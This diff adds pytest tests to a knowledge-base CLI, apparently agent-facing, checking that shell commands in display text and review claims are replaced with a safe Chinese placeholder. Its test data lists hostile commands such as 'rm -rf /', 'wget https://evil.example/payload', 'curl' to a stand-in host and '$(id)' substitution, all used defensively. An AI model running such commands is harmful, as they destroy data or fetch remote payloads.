@@ -1939,6 +1939,62 @@ def test_kb_find_sanitizes_multiline_commands_controls_and_long_values(
     assert truncated == "中" * 23 + "…"
 
 
+@pytest.mark.parametrize(
+    "dangerous",
+    [
+        "rm -rf /",
+        "curl https://evil.example",
+        "git status",
+        "git clean -fdx",
+        "wget https://evil.example/payload",
+        "bash -c id",
+        "sudo reboot",
+        "$(id)",
+    ],
+)
+def test_public_display_text_rejects_shell_commands_and_substitution(
+    tmp_path: Path,
+    dangerous: str,
+) -> None:
+    kb = _load_kb_cli()
+
+    assert kb._public_display_text(dangerous, tmp_path, "安全占位", 120) == "安全占位"
+
+
+def test_public_display_text_allows_natural_chinese_technical_text_and_kb_pseudo_cli(tmp_path: Path) -> None:
+    kb = _load_kb_cli()
+    statement = "Git 使用内容寻址存储，适合保留研究过程中的版本历史。"
+
+    assert kb._public_display_text(statement, tmp_path, "安全占位", 120) == statement
+    assert kb._public_display_text("kb review", tmp_path, "安全占位", 120) == "kb review"
+
+
+def test_shell_command_in_review_claim_routes_to_safe_explanation(
+    monkeypatch,
+    tmp_path: Path,
+    capsys,
+) -> None:
+    kb = _load_kb_cli()
+    record = _pending_record("p-shell-123456", "paper", "Normal")
+    record["payload"]["claims"][0]["text"] = "rm -rf /"
+    monkeypatch.setattr(
+        kb,
+        "forward_command",
+        lambda root, relative_script, args, *, stream=True: kb.CommandResult((relative_script, *args), 0),
+    )
+    monkeypatch.setattr(kb, "load_review_records", lambda root, fuzzy: [record])
+    monkeypatch.setattr(kb, "is_ready_for_human_review", lambda candidate: True)
+
+    assert kb.main(["--root", str(tmp_path), "--agent-protocol", "shell-review.json", "review"]) == 0
+
+    output = capsys.readouterr().out
+    assert output == "目前没有可供你安全确认的判断；请先让 Agent 安全解释这些已核验内容。\n"
+    assert "rm -rf" not in output
+    protocol = json.loads((tmp_path / "kb" / ".runtime" / "shell-review.json").read_text(encoding="utf-8"))
+    assert protocol["details"]["blocked_review_records"][0]["payload"]["claims"][0]["text"] == "rm -rf /"
+    assert protocol["next_actions"][0]["action"] == "explain_review_items_safely"
+
+
 def test_kb_recall_empty_digest_is_concise_chinese(monkeypatch, tmp_path: Path, capsys) -> None:
     kb = _load_kb_cli()
     calls: list[tuple[str, tuple[str, ...]]] = []
